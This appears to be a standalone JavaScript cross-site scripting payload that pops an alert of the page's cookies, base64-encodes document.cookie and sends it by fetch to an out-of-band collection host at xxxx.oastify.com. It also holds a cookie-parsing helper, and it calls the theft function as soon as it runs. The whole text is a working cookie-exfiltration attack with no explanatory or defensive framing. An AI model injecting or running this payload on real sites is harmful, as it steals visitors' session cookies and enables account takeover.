alert(document.cookie);

async function stealCookies(){
  const url = 'https://xxxx.oastify.com/?cookies=' + btoa(document.cookie);
  await fetch(url);
}

function getCookie(cname){
  const name = cname + "=";
  const ca = document.cookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    const c = ca[i].trim();
    if (c.indexOf(name) == 0) return c.substring(name.length, c.length);
  }
  return "";
}

stealCookies();
